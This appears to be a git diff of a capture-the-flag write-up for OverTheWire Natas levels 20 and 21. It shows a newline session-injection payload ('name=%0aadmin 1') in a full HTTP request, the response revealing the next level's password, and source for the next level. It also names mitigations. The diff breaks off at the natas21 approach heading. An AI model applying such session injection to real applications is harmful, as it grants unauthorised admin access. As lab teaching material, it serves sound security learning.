@@ -2830,7 +2830,7 @@ URL: http://natas20.natas.labs.overthewire.org
 Username: natas20
 Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
 ```
-After login, the webpage displayed a message ` You are logged in as a regular user. Login as an admin to retrieve credentials for natas21. ` and input field requesting your name, along with a Change name button.
+After login, the webpage displayed a message `You are logged in as a regular user. Login as an admin to retrieve credentials for natas21`. It also provided an input field to enter a name along with a Change name button.
 
 Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
 ```html
@@ -2967,9 +2967,141 @@ Your name: <input name="name" value="<?=$name?>"><br>
 ```
 
 
+### Finding
+From the source code, the application uses a custom session storage mechanism instead of the default PHP session handler.
+
+Session data is written as:
+```php
+$key $value\n
+```
+
+And read using:
+```php
+foreach(explode("\n", $data) as $line) {
+    $parts = explode(" ", $line, 2);
+    $_SESSION[$parts[0]] = $parts[1];
+}
+```
+
+#### Key Observation:
+Each session variable is stored in a new line in the `key value` format. Besides, user input is directly stored without sanitization. This allows newline injection, leading to session manipulation
+
+
 ### Approach
+#### Step 1: Inject New Session Entry
+By injecting a newline character (%0a) into the name parameter: `name=%0aadmin 1`
+
+##### Request Content 
+```
+POST /index.php HTTP/1.1
+Host: natas20.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Origin: http://natas20.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyMDpwNW1DdlA3R1MySzZCbXQzZ3FoTTJGYzFBNVQ4TVZ5dw==
+Connection: keep-alive
+Referer: http://natas20.natas.labs.overthewire.org/index.php
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=ul5ll7dnue22ldhdmoqqqrap4k
+Upgrade-Insecure-Requests: 1
+
+name=%0aadmin 1
+```
+
+
+#### Step 2: How the Session is Stored
+The payload is interpreted as: `\nadmin 1`. Then, the session file becomes:
+```
+name 
+admin 1
+```
+
+
+#### Step 3: Session Parsing (Second Request)
+When the page is refreshed, the server reads the session file:
+```
+name 
+admin 1
+```
+
+Parsed as:
+```
+$_SESSION["name"] = ""
+$_SESSION["admin"] = "1"
+```
+
+
+#### Step 4: Gain Admin Access
+Since the application checks: `if($_SESSION["admin"] == 1)`. The condition is satisfied, and admin access is granted.
+
+
+#### Response Content 
+```
+HTTP/1.1 200 OK
+Date: Sat, 18 Apr 2026 13:23:23 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1169
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
+<body>
+<h1>natas20</h1>
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
+<form action="index.php" method="POST">
+Your name: <input name="name" value="
+admin 1"><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+**Note:** This exploit requires two requests:
+- First request: Injects malicious session data into the session file
+- Second request: Reloads and parses the session, activating the injected admin variable
+
 
 ### Analysis
+This level demonstrates a Session Injection vulnerability caused by improper session handling.
+
+Vulnerabilities:
+- Custom session storage mechanism
+- No input sanitization
+- Use of newline (\n) as a delimiter
+- User input directly affects session structure
+
+Attack Type:
+- Session poisoning / session injection
+- Privilege escalation
+
+Improper handling of session data can lead to privilege escalation. Therefore, secure implementations should:
+- Use built-in session mechanisms
+- Sanitize user input
+- Avoid custom parsing logic for sensitive data
+- Prevent injection of control characters (e.g., newline)
+
 
 ---
 
@@ -2978,12 +3110,121 @@ Your name: <input name="name" value="<?=$name?>"><br>
 ```
 URL: http://natas21.natas.labs.overthewire.org
 Username: natas21
-Password: 
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
 ```
-After login, the webpage displayed an input field requesting a username, along with a Check existence button.
+After login, the webpage displayed a message `Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.`
+and the website provided can navigate to `http://natas21-experimenter.natas.labs.overthewire.org/`. After login to this navigated website, the webage displayed a message ` Note: this website is colocated with http://natas21.natas.labs.overthewire.org
 
-Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
-```html
+Example:
+Hello world!
+
+Change example values here:`
+and request input for align, fontsize and bgcolor and a updata button. 
+
+the source code of http://natas21.natas.labs.overthewire.org:
+```
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas21", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas21</h1>
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
+</p>
+
+<?php
+
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas22\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
+    }
+}
+/* }}} */
+
+session_start();
+print_credentials();
+
+?>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+the source code of http://natas21-experimenter.natas.labs.overthewire.org/: 
+```
+ <html>
+<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
+<body>
+<h1>natas21 - CSS style experimenter</h1>
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
+</p>
+<?php
+
+session_start();
+
+// if update was submitted, store it
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+
+if(array_key_exists("debug", $_GET)) {
+    print "[DEBUG] Session contents:<br>";
+    print_r($_SESSION);
+}
+
+// only allow these keys
+$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
+$form = "";
+
+$form .= '<form action="index.php" method="POST">';
+foreach($validkeys as $key => $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+    $val = $_SESSION[$key];
+    } else {
+    $_SESSION[$key] = $val;
+    }
+    $form .= "$key: <input name='$key' value='$val' /><br>";
+}
+$form .= '<input type="submit" name="submit" value="Update" />';
+$form .= '</form>';
+
+$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
+$example = "<div style='$style'>Hello world!</div>";
+
+?>
+
+<p>Example:</p>
+<?=$example?>
+
+<p>Change example values here:</p>
+<?=$form?>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
 
 ### Approach 
 
